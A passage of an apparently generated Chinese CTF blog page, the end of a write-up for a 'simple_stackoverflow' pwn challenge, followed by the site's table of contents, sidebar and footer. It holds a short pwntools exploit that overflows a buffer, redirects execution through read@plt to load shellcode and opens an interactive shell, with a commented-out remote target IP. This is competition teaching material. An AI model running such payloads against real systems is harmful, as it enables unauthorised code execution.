process(&amp;quot;./simple_stackoverflow&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;quot;139.199.10.70&amp;quot;,10004)</span></span><br><span class="line"></span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039; * (0x20 + 0x4) + p32(0x08048390) + p32(0x0804A040) + p32(0) + p32(0x0804A040) + p32(len(shellcode))</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>覆写eip的read函数地址应该是plt表中read地址，而不是read函数地址。即填入IDA中<code>_read</code>地址，而不是<code>read</code>地址</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">SkYe231</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://skyedai910.github.io/archives/a7cb8952/">https://skyedai910.github.io/archives/a7cb8952/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://skyedai910.github.io" target="_blank">SkYe231 Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a><a class="post-meta__tags" href="/tags/%E6%B5%B7%E5%95%B8%E6%9D%AF/">海啸杯</a></div><div class="post_share"><div class="social-share" data-image="/img/default_cover6.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/e0b3d41f/"><img class="prev-cover" data-lazy-src="/img/default_cover1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">i春秋CTF答题赛（第三季）WriteUp</div></div></a></div><div class="next-post pull-right"><a href="/archives/32/"><img class="next-cover" data-lazy-src="/img/default_cover3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Bugku-Pwn5</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/205/" title="2020 CISCN Writeup"><img class="cover" data-lazy-src="/img/default_cover5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 CISCN Writeup</div></div></a></div><div><a href="/archives/22e3ff4c/" title="2020 De1CTF Writeup"><img class="cover" data-lazy-src="/img/default_cover2.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 De1CTF Writeup</div></div></a></div><div><a href="/archives/18e23abd/" title="2020 RedpwnCTF Writeup"><img class="cover" data-lazy-src="/img/default_cover4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 RedpwnCTF Writeup</div></div></a></div><div><a href="/archives/216/" title="2020 SWPUCTF 部分Pwn Writeup"><img class="cover" data-lazy-src="/img/default_cover1.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 SWPUCTF 部分Pwn Writeup</div></div></a></div><div><a href="/archives/215/" title="2020 湖湘杯 PWN WriteUp"><img class="cover" data-lazy-src="/img/default_cover4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 湖湘杯 PWN WriteUp</div></div></a></div><div><a href="/archives/212/" title="2020 西普杯 信息安全铁人三项 第四赛区 Writeup"><img class="cover" data-lazy-src="/img/default_cover4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 西普杯 信息安全铁人三项 第四赛区 Writeup</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">SkYe231</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">66</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/skyedai910" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:skye231@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">请修改默认公告</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">1.1.</span> <span class="toc-text">签到题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag"><span class="toc-number">1.1.1.</span> <span class="toc-text">flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E7%83%9F%E6%9E%AA"><span class="toc-number">1.2.</span> <span class="toc-text">老烟枪</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E7%99%BD"><span class="toc-number">1.3.</span> <span class="toc-text">表白</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%98%8E%E7%9A%84%E6%B1%82%E5%8A%A9"><span class="toc-number">1.4.</span> <span class="toc-text">小明的求助</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AD%A6"><span class="toc-number">2.</span> <span class="toc-text">密码学</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%BA%E6%92%92%E5%B0%86%E5%86%9B"><span class="toc-number">2.1.</span> <span class="toc-text">恺撒将军</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-4"><span class="toc-number">2.1.1.</span> <span class="toc-text">flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%98%8E%E5%AE%B6%E7%9A%84%E5%B0%8F%E8%8F%9C%E5%9B%AD"><span class="toc-number">2.2.</span> <span class="toc-text">小明家的小菜园</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-5"><span class="toc-number">2.2.1.</span> <span class="toc-text">flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%98%E6%8A%A5"><span class="toc-number">2.3.</span> <span class="toc-text">战报</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-6"><span class="toc-number">2.3.1.</span> <span class="toc-text">flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">3.</span> <span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-reverse"><span class="toc-number">3.1.</span> <span class="toc-text">baby reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-7"><span class="toc-number">3.1.1.</span> <span class="toc-text">flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-reverse"><span class="toc-number">3.2.</span> <span class="toc-text">easy reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-8"><span class="toc-number">3.2.1.</span> <span class="toc-text">flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9C%B8%E7%8E%8B%E5%88%AB%E5%A7%AC"><span class="toc-number">3.3.</span> <span class="toc-text">霸王别姬</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-9"><span class="toc-number">3.3.1.</span> <span class="toc-text">flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B5%E7%AB%9E%E9%80%89%E6%89%8B"><span class="toc-number">3.4.</span> <span class="toc-text">电竞选手</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-10"><span class="toc-number">3.4.1.</span> <span class="toc-text">flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode"><span class="toc-number">4.1.</span> <span class="toc-text">shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">4.1.1.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-stackoverflow"><span class="toc-number">4.2.</span> <span class="toc-text">simple_stackoverflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">脚本</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/12117287/" title="Pwnable.kr unlink"><img data-lazy-src="/img/default_cover5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pwnable.kr unlink"/></a><div class="content"><a class="title" href="/archives/12117287/" title="Pwnable.kr unlink">Pwnable.kr unlink</a><time datetime="2021-03-26T09:04:13.982Z" title="更新于 2021-03-26 17:04:13">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/e258fe4d/" title="组建隧道中转流量（自建IPLC实现落地）"><img data-lazy-src="/img/default_cover6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="组建隧道中转流量（自建IPLC实现落地）"/></a><div class="content"><a class="title" href="/archives/e258fe4d/" title="组建隧道中转流量（自建IPLC实现落地）">组建隧道中转流量（自建IPLC实现落地）</a><time datetime="2021-03-26T09:02:03.023Z" title="更新于 2021-03-26 17:02:03">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/2a024eda/" title="劫持64位静态程序fini_array进行ROP攻击"><img data-lazy-src="/img/default_cover4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="劫持64位静态程序fini_array进行ROP攻击"/></a><div class="content"><a class="title" href="/archives/2a024eda/" title="劫持64位静态程序fini_array进行ROP攻击">劫持64位静态程序fini_array进行ROP攻击</a><time datetime="2021-03-26T09:01:15.659Z" title="更新于 2021-03-26 17:01:15">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/f3d2f4dc/" title="栈迁移学习（旧）"><img data-lazy-src="/img/default_cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="栈迁移学习（旧）"/></a><div class="content"><a class="title" href="/archives/f3d2f4dc/" title="栈迁移学习（旧）">栈迁移学习（旧）</a><time datetime="2021-03-26T09:00:31.780Z" title="更新于 2021-03-26 17:00:31">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/d7d152e1/" title="栈迁移学习（新）"><img data-lazy-src="/img/default_cover4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="栈迁移学习（新）"/></a><div class="content"><a class="title" href="/archives/d7d152e1/" title="栈迁移学习（新）">栈迁移学习（新）</a><time datetime="2021-03-26T08:59:43.602Z" title="更新于 2021-03-26 16:59:43">2021-03-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default_cover6.png')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By SkYe231</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://cloud.tencent.com/product/wh?from=12331" target="_blank">Hosted BY 云开发 Cloudbase</a>&nbsp;|&nbsp;<a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img src="https://mrskye.cn-gd.ufileos.com/img/2020-07-01-lGwrnPz3GuV4odmM.png" align="top" style="width:48px"></a><br /><div class="github-badge"><a rel="license" href="http://beian.miit.gov.cn/" target="_blank" title="粤ICP备20056619号"><span class="badge-subject">粤ICP备</span><span class="badge-value bg-black">20056619号</span></a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
